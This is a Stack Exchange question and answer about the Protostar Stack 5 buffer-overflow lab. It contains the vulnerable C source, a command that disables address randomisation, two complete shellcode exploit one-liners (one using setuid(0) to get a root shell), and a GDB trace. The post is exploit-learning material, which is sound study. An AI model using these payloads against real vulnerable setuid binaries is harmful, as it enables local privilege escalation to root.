{
    "title": "Why SUID Shellcode not working but Basic Shellcode working?",
    "link": "https://reverseengineering.stackexchange.com/questions/18558/why-suid-shellcode-not-working-but-basic-shellcode-working",
    "content": "I'm playing with Basic Buffer Overflow Protostar - Stack 5\n<pre><code>#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <string.h>\n\n//gcc -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -g bof2.c -o bof2\n//sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'\n\n\nint main(int argc, char **argv)\n{\n  char buffer[64];\n\n  gets(buffer);\n}\n</code></pre>\nThen I try simple shellcode http://shell-storm.org/shellcode/files/shellcode-811.php\nSo final payload looks like this \n<pre><code>(python -c \"print 'A'*72+'\\xf4\\xd1\\xff\\xff'+'\\x90'*200+'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'\"; tee) | ./protostar-stack5\n</code></pre>\nIt works like expected, so when I type <pre><code>id</code></pre> in STDIN then STDOUT will be my current <pre><code>id</code></pre> and so on.\nNow I want to try shellcode with <pre><code>SETUID(0)</code></pre> here is the link http://shell-storm.org/shellcode/files/shellcode-598.php\nso my final payload will be \n<pre><code>(python -c \"print 'A'*72+'\\xf4\\xd1\\xff\\xff'+'\\x90'*200+'\\x31\\xdb\\x8d\\x43\\x17\\xcd\\x80\\x53\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80'\"; tee) | ./protostar-stack5\n</code></pre>\nWhen I type <pre><code>id</code></pre> in STDIN I got <pre><code>Segmentation Fault</code></pre>\nSo I decide to check by step into from NOP to Shellcode inside GDB\n<pre><code>   0xffffd235:  nop\n   0xffffd236:  nop\n   0xffffd237:  nop\n=> 0xffffd238:  xor    ebx,ebx ; Start of Shellcode\n   0xffffd23a:  lea    eax,[ebx+0x17]\n   0xffffd23d:  int    0x80\n   0xffffd23f:  push   ebx\n   0xffffd240:  push   0x68732f6e\n   0xffffd245:  push   0x69622f2f\n   0xffffd24a:  mov    ebx,esp\n   0xffffd24c:  push   eax\n   0xffffd24d:  push   ebx\n   0xffffd24e:  mov    ecx,esp\n   0xffffd250:  cdq    \n   0xffffd251:  mov    al,0xb\n=> 0xffffd253:  int    0x80  ; End Of Shellcode\n   0xffffd255:  add    bh,bh ; Still executed\n   0xffffd257:  dec    DWORD PTR [ebx-0x25] ; Still executed\n   0xffffd25a:  (bad)  ; Still executed, this cause Segmentation fault\n   0xffffd25b:  jmp    DWORD PTR [edx-0x25]\n   0xffffd25e:  (bad)  \n   0xffffd25f:  push   DWORD PTR [ebx+ebx*8-0x1]\n\nLegend: code, data, rodata, value\nStopped reason: SIGILL\n0xffffd25a in ?? ()\n</code></pre>\nI step into from start of shellcode till the end of shellcode, I got no error but shell doesn't appear and it still execute instruction after the end of shellcode then it will be <pre><code>Segmentation Fault</code></pre> in the end\nI have already set SUID Bit in compiled program.\nSo Why I got <pre><code>Segmentation Fault</code></pre> instead of executing shell?\nWhy instruction after <pre><code>INT 80</code></pre> still executed, it's different with basic shellcode which give me shell after <pre><code>INT 80</code></pre> executed?  \nWhat should I do to make my payload which containt <pre><code>SETUID(0)</code></pre> work like expected?\nPS : I Want to ask it, fortunately it work by the end of writing question. Any other answer is welcome.\nThanks in advance.\n",
    "votes": "2",
    "answers": 1,
    "views": "763",
    "tags": [
        "buffer-overflow"
    ],
    "user": "Dark Cyber",
    "time": "Jun 19, 2018 at 10:36",
    "comments": [],
    "answers_data": [
        {
            "content": "Don't forget to set compiled program owner as root <pre><code>sudo chown root ./filename</code></pre> and don't forget to set SUID bit <pre><code>chmod u+s ./filename</code></pre>, because your payload contain <pre><code>SETUID(0)</code></pre>\n",
            "votes": "1",
            "user": "Dark Cyber",
            "time": "Jun 19, 2018 at 10:36",
            "is_accepted": true,
            "comments": []
        }
    ]
}